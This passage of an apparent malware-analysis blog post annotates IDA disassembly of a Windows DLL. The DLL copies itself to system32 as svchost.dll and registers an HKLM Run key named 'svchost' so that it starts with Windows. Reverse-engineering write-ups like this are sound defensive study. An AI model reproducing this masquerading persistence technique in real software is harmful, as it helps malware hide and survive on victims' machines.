</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6BB</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_1000A570</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6C0</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_110</span>], <span style=color:#b58900>eax</span>              <span style=color:#586e75>; return value stored in var_110</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6C6</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>phModule</span>], <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6D0</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>phModule</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6D6</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>                             <span style=color:#586e75>; phModule</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6D7</span> <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#268bd2>sub_1000A610</span>             <span style=color:#586e75>; lpModuleName</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6DC</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>6</span>                               <span style=color:#586e75>; dwFlags</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6DE</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>GetModuleHandleExA</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6E4</span> <span style=color:#268bd2>test</span>    <span style=color:#b58900>eax</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6E6</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_1000A711</span>              <span style=color:#586e75>; if (eax!=0) jmp loc_1000A711</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6E8</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>GetLastError</span>                 <span style=color:#586e75>; if (eax==0) print LastError to file</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6EE</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_120</span>], <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6F4</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_120</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6FA</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edx</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A6FB</span> <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aGetmodulehandl</span>          <span style=color:#586e75>; &#34;GetModuleHandle returned %d\n&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A700</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_1000AD77</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A705</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>40h</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A708</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>                             <span style=color:#586e75>; FILE *</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A709</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_fprintf</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A70E</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>0Ch</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>If <code>GetModuleHandleEx</code> was successful it will land here. <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">GetModuleFileName</a> is called which will return the full path for the specified module in <code>hModule</code>. In this case, the binary retrieves its own path (line 9) and saves it in <code>[ebp+Filename]</code>. In line 10, return value of <code>sub_1000A570</code> is compared with 2.</p><figure class=code><figcaption><span>Getting Dll path</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:1000<span style=color:#268bd2>A711</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A711</span> <span style=color:#268bd2>loc_1000A711</span>:
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A711</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>100h</span>            <span style=color:#586e75>; nSize</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A716</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>Filename</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A71C</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; lpFilename</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A71D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>phModule</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A723</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>             <span style=color:#586e75>; hModule</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A724</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>GetModuleFileNameA</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A72A</span> <span style=color:#268bd2>cmp</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_110</span>], <span style=color:#2aa198>2</span>           <span style=color:#586e75>; comparing return value of sub_1000A570 with 2</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A731</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_1000A772</span>         <span style=color:#586e75>; if return value is not 2, then jump to loc_1000A772</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>If registry key did not exist, we will continue.</p><figure class=code><figcaption><span>CopyFile</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:1000<span style=color:#268bd2>A733</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>lpNewFileName</span>], <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aCWindowsSystem</span> <span style=color:#586e75>; &#34;c:\\windows\\system32\\svchost.dll&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A73D</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_124</span>], <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aCWindowsSyst_0</span> <span style=color:#586e75>; &#34;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A747</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>0</span>               <span style=color:#586e75>; bFailIfExists - 0 means overwrite if file already exists</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A749</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>lpNewFileName</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A74F</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edx</span>             <span style=color:#586e75>; lpNewFileName ; &#34;c:\\windows\\system32\\svchost.dll&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A750</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>Filename</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A756</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; lpExistingFileName - Dll name from GetModuleFileName</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A757</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>CopyFileA</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A75D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_124</span>]   <span style=color:#586e75>; From line 2</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A763</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A764</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_1000A610</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A769</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>4</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A76C</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_114</span>], <span style=color:#b58900>eax</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>We have already seen the strings being loaded in lines 1 and 2. Then <code>CopyFile</code> is called to copy itself to <code>c:\\windows\\system32\\svchost.dll</code>.</p><figure class=code><figcaption><span>sub_1000A610</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:1000<span style=color:#268bd2>A610</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A611</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ebp</span>, <span style=color:#b58900>esp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A613</span> <span style=color:#268bd2>sub</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>0Ch</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A616</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>phkResult</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A619</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; phkResult</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A61A</span> <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aSoftwareMicr_0</span> <span style=color:#586e75>; &#34;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A61F</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>80000002h</span>       <span style=color:#586e75>; hKey   &#34;HKEY_LOCAL_MACHINE&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A624</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>RegCreateKeyA</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A62A</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_C</span>], <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A62D</span> <span style=color:#268bd2>cmp</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_C</span>], <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A631</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_1000A663</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Continue if RegCreateKey was successful</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A633</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>lpData</span>]  <span style=color:#586e75>; &#34;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A636</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>             <span style=color:#586e75>; char *</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A637</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_strlen</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A63C</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>4</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A63F</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; cbData - strlen(lpData)</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A640</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>lpData</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A643</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edx</span>             <span style=color:#586e75>; lpData - ; &#34;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A644</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>1</span>               <span style=color:#586e75>; dwType</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A646</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>0</span>               <span style=color:#586e75>; Reserved</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A648</span> <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aSvchost_0</span> <span style=color:#586e75>; &#34;svchost&#34;</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A64D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>phkResult</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A650</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; hKey</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A651</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>RegSetValueExA</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A657</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>], <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A65E</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A661</span> <span style=color:#268bd2>jmp</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_1000A673</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A673</span> <span style=color:#268bd2>loc_1000A673</span>:
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A673</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esp</span>, <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A675</span> <span style=color:#268bd2>pop</span>     <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A676</span> <span style=color:#268bd2>retn</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Line 9 pushes <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> to the stack and calls <code>sub_1000A610</code> in line 10. Based on this string and checking for existence of the registry key we can guess what is going to happen in this function.</p><p>Inside this function we see that <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724842%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">RegCreateKey</a> to open <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If the key does not exist, it will create it.</p><p>If call was successful, execution continues to line 14. It is adding a new registry key named <code>svchost</code> to that path with the specified value. Then function will return with the result value of RegSetValueEx. If it was successful, it will be 0.</p><p><em>The Dll copied itself to system32 and it will run every time Windows starts</em>.</p><figure class=code><figcaption><span>Returning from sub_1000A610</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:1000<span style=color:#268bd2>A757</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>CopyFileA</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A75D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_124</span>]
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A763</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A764</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_1000A610</span>     <span style=color:#586e75>; Create registry key</span>
</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A769</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>4</span>
